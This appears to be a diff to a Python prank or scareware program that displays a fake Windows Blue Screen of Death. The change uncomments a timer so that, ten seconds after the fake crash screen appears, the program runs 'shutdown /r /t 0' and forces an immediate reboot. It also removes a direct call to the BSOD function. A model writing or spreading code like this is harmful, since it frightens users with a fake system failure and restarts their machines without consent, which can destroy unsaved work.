@@ -44,9 +44,8 @@ def show_BSOD(event=None):
     BSOD.focus_force()
     def shutdown_after_timeout():
         os.system("shutdown /r /t 0")
-    #BSOD.after(10000, shutdown_after_timeout)
+    BSOD.after(10000, shutdown_after_timeout)
     BSOD.mainloop()
-show_BSOD()
 def show_image(image_path):
     global active_images, active_windows, interation
     print('\a')
